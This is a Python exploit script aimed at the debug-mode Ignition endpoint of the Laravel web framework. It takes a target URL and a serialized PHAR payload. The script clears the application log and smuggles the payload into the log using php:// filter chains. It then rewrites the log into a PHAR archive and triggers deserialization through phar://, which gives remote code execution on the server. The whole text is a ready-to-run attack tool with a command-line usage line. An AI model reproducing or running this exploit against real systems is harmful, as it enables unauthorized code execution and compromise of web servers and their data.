import base64
import json
import sys
from dataclasses import dataclass

import requests
from pwn import log, success


@dataclass
class Exploit:
    session: requests.Session
    url: str
    payload: bytes
    log_path: str = ""

    def exploit(self):
        if not self.log_path:
            self.log_path = self.get_log_path()
        try:
            self.clear_logs()
            self.put_payload()
            self.convert_to_phar()
            self.run_phar()
        except:
            self.clear_logs()
            self.put_payload(True)
            self.convert_to_phar()
            self.run_phar()
        finally:
            self.clear_logs()

    def to_unicode(self, text):
        return "".join(["\\u00" + hex(ord(c))[2:] for c in text])

    def get_log_path(self):
        r = self.run_wrapper("DOESNOTEXIST")

        full_path = r.json()["file"]
        if not full_path:
            log.error("Unable to find full path")

        path = full_path[: full_path.index("/vendor/")] + "/storage/logs/laravel.log"

        r = self.run_wrapper(path)
        if r.status_code != 200:
            log.error(f"Log file does not exist: {path}")

        success(f"Log file: {path}")
        return path

    def clear_logs(self):
        self.run_wrapper(f"php://filter/read=consumed/resource={self.log_path}")
        success("Logs cleared")
        return True

    def get_write_filter(self):
        filters = "|".join(("convert.quoted-printable-decode", "convert.iconv.utf-16le.utf-8", "convert.base64-decode"))
        return f"php://filter/write={filters}/resource={self.log_path}"

    def run_wrapper(self, wrapper):
        return self.session.post(
            self.url + "/_ignition/execute-solution",
            headers={"Accept": "application/json", "Content-Type": "application/json"},
            data=json.dumps(
                {
                    "solution": self.to_unicode("Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"),
                    "parameters": {"viewFile": wrapper, "variableName": "doesnotexist"},
                }
            ).replace("\\\\", "\\"),
        )

    def put_payload(self, padding=False):
        payload = self.generate_payload(padding)
        # This garanties the total log size is even
        self.run_wrapper(payload)
        self.run_wrapper("AA")

    def generate_payload(self, padding=False):
        payload = base64.b64encode(self.payload).decode().rstrip("=")
        payload = "".join(c + "=00" for c in payload)
        # The payload gets displayed twice: use an additional '=00' so that
        # the second one does not have the same word alignment

        # add multiple A before the actual payload to get rid of truncated payload like "file_get_contents('P=00D=009=00w=0...')"
        # this behavior may lead to unable to decode
        payload = "A" * 100 + payload

        if padding:
            payload += "=00"
        return payload

    def convert_to_phar(self):
        r = self.run_wrapper(self.get_write_filter())
        if r.status_code != 200:
            log.error("Convertion to PHAR failed (try again ?)")

        success("Successfully converted to PHAR !")

    def run_phar(self):
        r = self.run_wrapper(f"phar://{self.log_path}/test.txt")
        if r.status_code != 200:
            log.error("Deserialisation failed ?!!")

        success("Phar deserialized")
        print(r.text)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        log.error("Usage: python3 exploit.py <url> <PHAR payload>")

    session = requests.Session()
    # session.proxies = {"http": "http://localhost:8080"}

    payload = open(sys.argv[2], "rb").read()

    exploit = Exploit(session, sys.argv[1].rstrip("/"), payload)
    exploit.exploit()
